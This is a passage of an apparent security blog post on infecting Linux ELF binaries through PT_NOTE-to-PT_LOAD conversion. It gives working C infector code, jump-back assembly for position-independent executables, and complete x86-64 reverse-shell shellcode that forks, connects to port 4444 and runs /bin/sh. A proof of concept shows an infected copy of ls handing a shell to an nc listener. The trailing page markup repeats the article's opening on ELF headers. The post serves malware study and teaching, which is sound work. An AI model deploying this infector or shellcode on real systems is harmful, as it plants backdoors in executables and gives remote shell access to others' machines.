0x48, 0x8b, 0x04, 0x24, 0xc3 }; // Write values using little-endian ordering write_u64_le(\u0026jump_shellcode[7], (uint64_t)(*shellcode_len)); write_u64_le(\u0026jump_shellcode[17], entry_point); write_u64_le(\u0026jump_shellcode[27], original_entry); // Extend shellcode vector by appending the jump_shellcode size; // Realloc new size, memcpy jump_shellcode into extended space size_t new_len = *shellcode_len + sizeof(jump_shellcode); unsigned char *new_shellcode = realloc(*shellcode, new_len); if (new_shellcode == NULL) { fprintf(stderr, \"Error reallocating shellcode buffer\\n\"); free(*shellcode); exit(1); } memcpy(new_shellcode + *shellcode_len, jump_shellcode, sizeof(jump_shellcode)); *shellcode = new_shellcode; *shellcode_len = new_len; } Our shellcode length, aka VSIZE, is stored starting at byte 8. Our entry point, aka ENTRY, is stored at byte 17. Our original entry, aka START is stored at byte 27.\nSee, the constants we define in the assembly – which we use to generate the jump shellcode – are merely placeholders. The values in the jump_shellcode array are being overwritten with our values – our shellcode length, entry point, and original entry.\nAfter the patch function completes, we go back to the main function where we write all of this back to the target ELF – appending our shellcode to the end of the binary by calling SEEK_END on our ELF file descriptor – and using our write gadgets to write back the altered program headers to the ELF file.\nBelow is the assembly code of the jump_shellcode array. If it doesn’t make sense yet, I’ll try to explain below.\nBITS 64 %define VSIZE 0xDEADBEEFDEADBEEF %define ENTRY 0xBAADF00DBAADF00D %define START 0xB16B00B5B16B00B5 ; - position independent executables move addresses, so ; 1) call to get_foo instruction pointer into rax then ; 2) load our constants into registers r9, r10, r11 ; 3) subtract our malware size, (\u0026 subtract 5!) ; *(the size of the get_foo instruction) ; 4) subtract patched entry offset from rax ; 5) add our original entry point to r11 ; 6) finally jmp to rax call get_foo mov r9, VSIZE mov r10, ENTRY mov r11, START sub rax, r9 sub rax, 5 sub rax, r10 add rax, r11 jmp rax get_foo: mov rax, [rsp] ret Why do we need the patch? Modern ELF binaries are often built to use ASLR and therefore tend to be position independent executables. That is to say, each time an ELF file runs, its address layout is semi-randomized and loaded into a different memory space.12 It achieves this by implementing a random base address.\nThis means we can’t just hardcode a return address to go to after our malware executes. And instead, we rely on this one weird trick we append to the end of our malware code to help us jump back to the original entry point.13\nThe constants end up representing our malware shellcode size, our memory_offset (the new e_entry), and the original entry point that we\nWith our bytes now patched into this mini program, the logic of the assembly code works like this. Think about it.\nAfter our malware has executed, we slide into the jump_shellcode. We first call get_foo and store the stack pointer in rax and then return.\nWe then move our constants – the malware shellcode size, patched entry, and the original start address, to registers r9, r10, and r11.\nThen we do the following trick. You can visualize this pretty clearly. Remember, after our virus has executed, we are currently at the end of the malware shellcode, where we enter the additional jump_shellcode array. So, in order to find out where we are, we have to work backwards.\nSo first we substract the size of our malware shellcode VSIZE from the stack pointer in rax. Then we subtract 5 to adjust for the size of the get_foo instruction itself.\nAt this point in time, the stack pointer is now effectively back at the patched ENTRY offset. But we want to get to the original START entry point. So we substract the ENTRY offset, extracting the base randomization!\nAnd now we add back the original entry point START we stored in r11 to rax. That is, rax now contains the original entry point so we can call jmp rax, landing into the ELF’s original entry point and preserving the program’s host behavior – every time – even though the executable is position independent.\nWith our jump_shellcode appended to our original shellcode, we write all of the alterations back to the ELF binary:\n// Append shellcode to the very end of the target ELF if (lseek(elf_fd, 0, SEEK_END) \u003c 0) { fprintf(stderr, \"Error seeking to end of ELF file: %s\\n\", strerror(errno)); close(elf_fd); free(elf_header); free(program_headers); free(shellcode); exit(1); } if (write(elf_fd, shellcode, shellcode_len) != (ssize_t)shellcode_len) { fprintf(stderr, \"Error writing shellcode to ELF file\\n\"); close(elf_fd); free(elf_header); free(program_headers); free(shellcode); exit(1); } //snipped // Write the ELF64 program headers to the file at offset phoff // Return 0 on success, or non-zero on failure int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs) { if (lseek(fd, phoff, SEEK_SET) \u003c 0) { fprintf(stderr, \"Error seeking to program headers offset for writing\\n\"); return 1; } size_t total_size = sizeof(Elf64_Phdr) * phnum; if (write(fd, phdrs, total_size) != (ssize_t)total_size) { fprintf(stderr, \"Error writing program headers to ELF file\\n\"); return 1; } return 0; } // Write the ELF64 header to the beginning of the file // Return 0 on success, or non-zero on failure int write_elf64_header(int fd, Elf64_Ehdr *header) { if (lseek(fd, 0, SEEK_SET) \u003c 0) { fprintf(stderr, \"Error seeking to beginning of ELF file for header writing\\n\"); return 1; } if (write(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) { fprintf(stderr, \"Error writing ELF header to file\\n\"); return 1; } return 0; } Assembling a Payload Embarrassingly, it took me a little while to get a reliable payload working. Initially, my program would segfault and I thought I messed up the infector. At another point, it would segfault while the shell would survive. And as I got closer, it would sometimes almost work–but yet still segfault.\n$ ./ls Segmentation fault (core dumped) $ ./ls Segmentation fault (core dumped) $ ./ls elf_infector maybe maybe2 maybe3.s maybe4.s maybe5.s maybe6.s maybe7.s maybe8.s ls maybe.s maybe2.s maybe4 maybe5 maybe6 maybe7 maybe8 Segmentation fault (core dumped) $ ./ls elf_infector maybe maybe2 maybe3.s maybe4.s maybe5.s maybe6.s maybe7.s maybe8.s ls maybe.s maybe2.s maybe4 maybe5 maybe6 maybe7 maybe8 Segmentation fault (core dumped) $ ./ls Segmentation fault (core dumped) $ ./ls elf_infector maybe maybe2 maybe3.s maybe4.s maybe5.s maybe6.s maybe7.s maybe8.s ls maybe.s maybe2.s maybe4 maybe5 maybe6 maybe7 maybe8 Segmentation fault (core dumped) (╯°□°）╯︵ ┻━┻ One issue was the way that I originally ordered the logic of the fork in my payload code. Initially I tried to jump into the fork. And then I accidentally mucked up the stack. But then I realized that you could just spawn it and return to the parent process pretty easily.\nThe other issues were with ret sometimes messing up the stack alignment. If you call ret at the end, during the return to the parent process, it messes up the stack.\nEventually, I realized that the answer to all of this was a lot more straight forward and that my approach to using fork to spawn a process in the background was feasible and could be improved. And that the stack could in fact be preserved and restored in a reliable way.\nAfter a bit of trial and error – and remembering to correctly return the stack pointer – the shellcode seems reliable now. In the end, the stable assembly code I ended up creating goes something like this:\nFirst, we try to preserve the behavior of the infected host binary by saving all of the registers by pushing them to the stack, along with the stack pointer.\nOnly then do we try to call the fork syscall. The child_process then spawns off where it prepares its networking code.\nInside the forked child_process, we prepare to use the socket syscall by setting up the AF_INET, SOCK_STREAM, and IPPROTOC_TCP arguments.\nIf the socket setup fails, our child_process – now separated from the parent – fails silently. Otherwise, we likely have a good file descriptor and so we move it to rdi.\nContinuing, we prepare to use the connect syscall. First we xor the rdx register clearing it before pushing it to the stack as a NULL pad, before pushing the address we want to connect to. Here, we just use localhost, 127.0.0.1, and our chosen port 4444.\nWe push the AF_INET (address family) 2, then move the stack pointer to rsi for the sockaddr pointer and set it to its correct structure size of 16 bytes.\nWe make the connect syscall which uses the previously mentioned bits along with our file descriptor in rdi, and if it fails, we exit gracefully. Otherwise, we setup to duplicate the file descriptor with dup2 and move on to execute our shell.\n“dup2 doesn’t switch the file descriptors, it makes them equivalent. After dup2(f1, 0), whatever file was opened on descriptor f1 is now also opened (with the same mode and position) on descriptor 0, i.e. on standard input.\nIf the target file descriptor was open, it is closed by the dup2 call. This is useful (among other things) when you have part of a program that reads or write from the standard file descriptors. For example, suppose that somefunc() reads from standard input, but you want it to read from a different file from where the rest of the program is getting its standard input. Then you can do (error checking omitted):”\nint save_stdin = dup(0); int somefunc_input_fd = open(\"input-for-somefunc.data\", O_RDONLY); dup2(somefunc_input_fd, 0); /* Now the original stdin is open on save_stdin, and input-for-somefunc.data on both somefunc_input_fd and 0. */ somefunc(); close(somefunc_input_fd); dup2(save_stdin, 0); close(save_stdin); This useful insight brought to you by netizen “Gilles ‘SO- stop being evil’” of StackOverflow\nDup2 lets us duplicate the file descriptor to handle stdin, stdout, and stderr pipes. After we decrement through the dup2_loop, we can use them with a shell.\nSo we build the /bin/sh pathname array and move it to rbx, followed by the path to the argument of the pathname!\nOur final code looks like this, with execve(\"/bin/sh\", [\"/bin/sh\"], NULL). If all goes well, we receive a shell on our listener and the original behavior of our infected host program is preserved.\nBITS 64 global _start section .text _start: ; save original stack pointer mov r12, rsp ; preserve rsp in r12 ; save all registers push rax push rbx push rcx push rdx push rsi push rdi push rbp push r8 push r9 push r10 push r11 ; fork to isolate shellcode execution mov rax, 57 ; sys_fork syscall test rax, rax jnz parent ; parent continues host execution child_process: ; socket syscall ; int socket(int domain, int type, int protocol) mov rax, 41 ; sys_socket mov rdi, 2 ; AF_INET mov rsi, 1 ; SOCK_STREAM mov rdx, 6 ; IPPROTO_TCP syscall cmp rax, 0 jl exit ; if socket fails, exit ; save socket file descriptor in rdi mov rdi, rax ; connect syscall ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) mov rax, 42 ; sys_connect ; build sockaddr_in structure on the stack xor rdx, rdx push rdx ; null pad push dword 0x0100007f ; 127.0.0.1, ip address push word 0x5c11 ; port 4444, network byte order push word 2 ; AF_INET mov rsi, rsp ; pointer to sockaddr_in structure mov rdx, 16 ; size of sockaddr_in syscall cmp rax, 0 jl exit ; if connect fails, exit ; dup2 syscall: int dup2(int oldfd, int newfd) mov rsi, 3 ; Start with stderr (2), work down to stdin (0) dup2_loop: dec rsi ; Decrement file descriptor (2 -\u003e 1 -\u003e 0) mov rax, 33 ; sys_dup2 syscall jnz dup2_loop ; loop until rsi is 0 ; execve syscall ; int execve(const char *pathname, char *const argv[], char *const envp[]) xor rax, rax push rax ; NULL terminator mov rbx, 0x68732f6e69622f2f ; \"//bin/sh\" in reverse byte order push rbx mov rdi, rsp ; Pathname pointer push rax ; NULL terminator for argv push rdi ; pointer to the string \"//bin/sh\" mov rsi, rsp ; argv -\u003e [pointer_to_string, NULL] xor rdx, rdx ; envp -\u003eNULL mov al, 59 ; syscall, execve syscall ; if execve fails, exit exit: xor rax, rax mov al, 60 ; sys_exit xor rdi, rdi syscall parent: ; restore registers and continue host execution pop r11 pop r10 pop r9 pop r8 pop rbp pop rdi pop rsi pop rdx pop rcx pop rbx pop rax mov rsp, r12 ; restore stack pointer The last thing we do in order to ensure our exploit runs and lands smoothly is to pop all of our registers back in the proper reverse order that we pushed them – and then move the stack pointer we saved earlier in r12 back to rsp.\nProof of Concept $ gcc -o elf_infector elf_infector.c $ cp $(which ls) ls $ nasm -o shellcode shellcode.s $ ./elf_infector ./ls shellcode [+] Found PT_NOTE section [+] Changing to PT_LOAD [+] Patched e_entry $ ./ls elf_infector elf_infector.c ls shellcode shellcode.s Meanwhile… in our other console:\n$ nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 127.0.0.1 51020 cat /etc/issue Ubuntu 24.04.2 LTS \\n \\l uname -a Linux vr 6.8.0-53-generic #55-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 17 15:37:52 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux ELF Infector on Github.\nV2 You might have noticed a possible discrepancy in the core functionality of our program where we modify the program headers. We added the sc_len derived from our shellcode_len value to the p_filesz and p_memsz to make room for our shellcode.\nIn that scenario, we called the patch function afterward, which modifies both the shellcode_len and shellcode buffer, extending them both before pointing them to a new shellcode buffer and length. And afterward, we then write it back to the ELF file.\nBut the ELF segment modififications we specified before in the PT_LOAD segment – p_filesz and p_memsz – still have the old shellcode length.\nLuckily, memory from p_filesz through p_memsz actually gets rounded up to the next page size for alignment purposes. So our patched shellcode still runs even though we didn’t specify the new length when manipulating the PT_LOAD fields.\n/* * Map \"eppnt-\u003ep_filesz\" bytes from \"filep\" offset \"eppnt-\u003ep_offset\" * into memory at \"addr\". (Note that p_filesz is rounded up to the * next page, so any extra bytes from the file must be wiped.) */ static unsigned long elf_map(struct file *filep, unsigned long addr, const struct elf_phdr *eppnt, int prot, int type, unsigned long total_size) { unsigned long map_addr; unsigned long size = eppnt-\u003ep_filesz + ELF_PAGEOFFSET(eppnt-\u003ep_vaddr); unsigned long off = eppnt-\u003ep_offset - ELF_PAGEOFFSET(eppnt-\u003ep_vaddr); addr = ELF_PAGESTART(addr); size = ELF_PAGEALIGN(size); /* mmap() will return -EINVAL if given a zero size, but a * segment with zero filesize is perfectly valid */ if (!size) return addr; /* * total_size is the size of the ELF (interpreter) image. * The _first_ mmap needs to know the full size, otherwise * randomization might put this image into an overlapping * position with the ELF binary image. (since size \u003c total_size) * So we first map the 'big' image - and unmap the remainder at * the end. (which unmap is needed for ELF images with holes.) */ if (total_size) { total_size = ELF_PAGEALIGN(total_size); map_addr = vm_mmap(filep, addr, total_size, prot, type, off); if (!BAD_ADDR(map_addr)) vm_munmap(map_addr+size, total_size-size); } else map_addr = vm_mmap(filep, addr, size, prot, type, off); if ((type \u0026 MAP_FIXED_NOREPLACE) \u0026\u0026 PTR_ERR((void *)map_addr) == -EEXIST) pr_info(\"%d (%s): Uhuuh, elf segment at %px requested but the memory is mapped already\\n\", task_pid_nr(current), current-\u003ecomm, (void *)addr); return(map_addr); } And:\n/* * Map \"eppnt-\u003ep_filesz\" bytes from \"filep\" offset \"eppnt-\u003ep_offset\" * into memory at \"addr\". Memory from \"p_filesz\" through \"p_memsz\" * rounded up to the next page is zeroed. */ static unsigned long elf_load(struct file *filep, unsigned long addr, const struct elf_phdr *eppnt, int prot, int type, unsigned long total_size) { unsigned long zero_start, zero_end; unsigned long map_addr; if (eppnt-\u003ep_filesz) { map_addr = elf_map(filep, addr, eppnt, prot, type, total_size); if (BAD_ADDR(map_addr)) return map_addr; if (eppnt-\u003ep_memsz \u003e eppnt-\u003ep_filesz) { zero_start = map_addr + ELF_PAGEOFFSET(eppnt-\u003ep_vaddr) + eppnt-\u003ep_filesz; zero_end = map_addr + ELF_PAGEOFFSET(eppnt-\u003ep_vaddr) + eppnt-\u003ep_memsz; /* * Zero the end of the last mapped page but ignore * any errors if the segment isn't writable. */ if (padzero(zero_start) \u0026\u0026 (prot \u0026 PROT_WRITE)) return -EFAULT; } } else { map_addr = zero_start = ELF_PAGESTART(addr); zero_end = zero_start + ELF_PAGEOFFSET(eppnt-\u003ep_vaddr) + eppnt-\u003ep_memsz; } if (eppnt-\u003ep_memsz \u003e eppnt-\u003ep_filesz) { /* * Map the last of the segment. * If the header is requesting these pages to be * executable, honour that (ppc32 needs this). */ int error; zero_start = ELF_PAGEALIGN(zero_start); zero_end = ELF_PAGEALIGN(zero_end); error = vm_brk_flags(zero_start, zero_end - zero_start, prot \u0026 PROT_EXEC ? VM_EXEC : 0); if (error) map_addr = error; } return map_addr; } Our original proof of concept works fine. But we can rewrite the logic like this, calling the patch function first, getting the updated shellcode length before modifying p_filesz and p_memsz. I mean, if we were going to be pedantic about it.\n// Patch shellcode to jump to the original entry point after finishing // // We'll be setting e_entry to memory_offset, so we we'll pass it // ahead of time to the patch function patch(\u0026shellcode, \u0026shellcode_len, memory_offset, original_entry); // After the patch function executes, our shellcode length and buffer // are different. Update sc_len to the patched length to be pedantic // uint64_t sc_len = (uint64_t)shellcode_len; // Look for PT_NOTE section for (int i = 0; i \u003c elf_header-\u003ee_phnum; i++) { if (program_headers[i].p_type == PT_NOTE) { // Convert to a PT_LOAD section with values to load shellcode printf(\"[+] Found PT_NOTE section\\n\"); printf(\"[+] Changing to PT_LOAD\\n\"); program_headers[i].p_type = PT_LOAD; program_headers[i].p_flags = PF_R | PF_X; program_headers[i].p_offset = file_offset; program_headers[i].p_vaddr = memory_offset; program_headers[i].p_memsz += sc_len; program_headers[i].p_filesz += sc_len; // Patch the ELF header to start at the shellcode elf_header-\u003ee_entry = memory_offset; printf(\"[+] Patched e_entry\\n\"); break; } } https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h#L226 ↩︎\nhttps://man7.org/linux/man-pages/man5/elf.5.html ↩︎\nhttps://docs.oracle.com/cd/E19683-01/817-3677/chapter6-83432/index.html ↩︎\nhttps://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L362 ↩︎\nhttps://man7.org/linux/man-pages/man2/execve.2.html ↩︎\nhttps://man7.org/linux/man-pages/man2/brk.2.html ↩︎\nhttps://stackoverflow.com/questions/6988487/what-does-the-brk-system-call-do ↩︎\nhttps://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L734 ↩︎\nhttps://docs.oracle.com/cd/E19683-01/816-1386/6m7qcobkp/index.html ↩︎\nhttps://elixir.bootlin.com/glibc/glibc-2.1/source/elf/rtld.c ↩︎\nhttps://docs.oracle.com/cd/E19683-01/816-1386/chapter6-83432/index.html ↩︎\nhttps://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux ↩︎\n“Note on resolving Elf_Hdr-\u003ee_entry in PIE executables.” https://archive.org/details/pocorgtfo20/page/n49/mode/1up ↩︎\n","wordCount":"6714","inLanguage":"en","image":"https://hexagram.foo/fog.jpeg","datePublished":"2025-02-23T00:00:00Z","dateModified":"2025-02-23T00:00:00Z","author":{"@type":"Person","name":"Stephan Bridger"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hexagram.foo/posts/infecting-linux-elf-files/"},"publisher":{"@type":"Organization","name":"Stephan Bridger","logo":{"@type":"ImageObject","url":"https://hexagram.foo/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hexagram.foo/ accesskey=h title="Stephan Bridger (Alt + H)">Stephan Bridger</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hexagram.foo/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://hexagram.foo/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hexagram.foo/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://hexagram.foo/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Infecting Linux ELF Files</h1><div class=post-meta><span title='2025-02-23 00:00:00 +0000 UTC'>February 23, 2025</span>&nbsp;·&nbsp;<span>32 min</span>&nbsp;·&nbsp;<span>6714 words</span>&nbsp;·&nbsp;<span>Stephan Bridger</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#elfland aria-label=Elfland>Elfland</a></li><li><a href=#loading aria-label=Loading>Loading</a></li><li><a href=#segment-types aria-label="Segment Types">Segment Types</a></li><li><a href=#constructing-an-infector aria-label="Constructing an Infector">Constructing an Infector</a></li><li><a href=#and-patch-me-up aria-label="And Patch Me Up">And Patch Me Up</a></li><li><a href=#assembling-a-payload aria-label="Assembling a Payload">Assembling a Payload</a></li><li><a href=#proof-of-concept aria-label="Proof of Concept">Proof of Concept</a></li><li><a href=#v2 aria-label=V2>V2</a></li></ul></div></details></div><div class=post-content><h2 id=elfland>Elfland<a hidden class=anchor aria-hidden=true href=#elfland>#</a></h2><p>Lately I&rsquo;ve been thinking about Linux internals and malware. In this blog post, we&rsquo;re going to hark about the ELFs. Just as Windows has its own <a href=https://www.stephan.onl/2023/08/portable-executable-format-and.html>executable format</a>, so too does Linux.</p><p>If we look at the source code<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> to the Executable and Linkable Format specification in <code>elf.h</code>, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>elf64_hdr</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>e_ident</span><span class=p>[</span><span class=n>EI_NIDENT</span><span class=p>];</span> <span class=cm>/* ELF &#34;magic number&#34; */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_machine</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>e_version</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span> <span class=n>e_entry</span><span class=p>;</span>       <span class=cm>/* Entry point virtual address */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Off</span> <span class=n>e_phoff</span><span class=p>;</span>        <span class=cm>/* Program header table file offset */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Off</span> <span class=n>e_shoff</span><span class=p>;</span>        <span class=cm>/* Section header table file offset */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>e_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_ehsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_phentsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_phnum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_shentsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_shnum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>e_shstrndx</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Ehdr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* These constants define the permissions on sections in the program
</span></span></span><span class=line><span class=cl><span class=cm>   header, p_flags. */</span>
</span></span><span class=line><span class=cl><span class=cp>#define PF_R    0x4
</span></span></span><span class=line><span class=cl><span class=cp>#define PF_W    0x2
</span></span></span><span class=line><span class=cl><span class=cp>#define PF_X    0x1
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>elf64_phdr</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>p_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>p_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Off</span> <span class=n>p_offset</span><span class=p>;</span>       <span class=cm>/* Segment file offset */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span> <span class=n>p_vaddr</span><span class=p>;</span>       <span class=cm>/* Segment virtual address */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span> <span class=n>p_paddr</span><span class=p>;</span>       <span class=cm>/* Segment physical address */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>p_filesz</span><span class=p>;</span>     <span class=cm>/* Segment size in file */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>p_memsz</span><span class=p>;</span>      <span class=cm>/* Segment size in memory */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>p_align</span><span class=p>;</span>      <span class=cm>/* Segment alignment, file &amp; memory */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Phdr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>elf64_shdr</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>sh_name</span><span class=p>;</span>   <span class=cm>/* Section name, index in string table */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>sh_type</span><span class=p>;</span>   <span class=cm>/* Type of section */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>sh_flags</span><span class=p>;</span>   <span class=cm>/* Miscellaneous section attributes */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span> <span class=n>sh_addr</span><span class=p>;</span>   <span class=cm>/* Section virtual addr at execution */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Off</span> <span class=n>sh_offset</span><span class=p>;</span>    <span class=cm>/* Section file offset */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>sh_size</span><span class=p>;</span>    <span class=cm>/* Size of section in bytes */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>sh_link</span><span class=p>;</span>   <span class=cm>/* Index of another section */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>sh_info</span><span class=p>;</span>   <span class=cm>/* Additional section information */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>sh_addralign</span><span class=p>;</span> <span class=cm>/* Section alignment */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>sh_entsize</span><span class=p>;</span> <span class=cm>/* Entry size if section holds table */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Shdr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>elf64_note</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>n_namesz</span><span class=p>;</span>  <span class=cm>/* Name size */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>n_descsz</span><span class=p>;</span>  <span class=cm>/* Content size */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>n_type</span><span class=p>;</span>    <span class=cm>/* Content type */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Nhdr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>elf64_sym</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>st_name</span><span class=p>;</span>   <span class=cm>/* Symbol name, index in string tbl */</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>st_info</span><span class=p>;</span>  <span class=cm>/* Type and binding attributes */</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>st_other</span><span class=p>;</span> <span class=cm>/* No defined meaning, 0 */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Half</span> <span class=n>st_shndx</span><span class=p>;</span>    <span class=cm>/* Associated section index */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span> <span class=n>st_value</span><span class=p>;</span>    <span class=cm>/* Value of the symbol */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>st_size</span><span class=p>;</span>    <span class=cm>/* Associated symbol size */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Sym</span><span class=p>;</span>
</span></span></code></pre></div><p><em>&ldquo;OK, so what?&rdquo;</em> We&rsquo;re interested in how the <code>elf64_hdr</code> works. And it turns out it essentially uses a lookup table. The offset to the program header table is located in <code>e_phoff</code>. The program header table itself is defined by various <code>elf64_phdr</code> segments.</p><p>Additionally, <code>elf64_shdr</code> section headers hold data, variables, and linking information<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>:</p><ul><li><strong>.text</strong> for code instructions,</li><li><strong>.rodata</strong> for read-only data,</li><li><strong>.plt</strong> for the procedure linkage table,</li><li><strong>.data</strong> segment for initialized data,</li><li><strong>.bss</strong> section for uninitialized variables,</li><li><strong>.got.plt</strong> section for dynamic interactions between the global offset table and procedure linkage table,</li><li><strong>.dynsym</strong> for dynamic symbols imported from shared libraries,</li><li><strong>.dynstr</strong> for dynamic strings,</li><li><strong>.rel</strong> for relocation symbols,</li><li><strong>.hash</strong> for hash table lookups,</li><li><strong>.symtab</strong> for all symbols,</li><li><strong>.strtab</strong> for a string table,</li><li><strong>.shstrtab</strong> for a table to resolve the names of each of the tables themselves,</li><li><strong>.ctors</strong> and <strong>.dtors</strong> - constructors and destructors - function pointers for initialization and finalization sequences before any code in the main body of the program executes.</li></ul><p>However, many of these section headers aren&rsquo;t actually necessary for execution and can be stripped out from the binary. They mostly hold information for linking and debugging purposes.</p><p>Our primary interest is in the <code>elf64_phdr</code> table segments. This table controls what should or shouldn&rsquo;t be loaded into memory at runtime.<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup> When an ELF file is executed, it gets mapped<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup> by <code>mmap</code> according to whatever is specified by the ELF 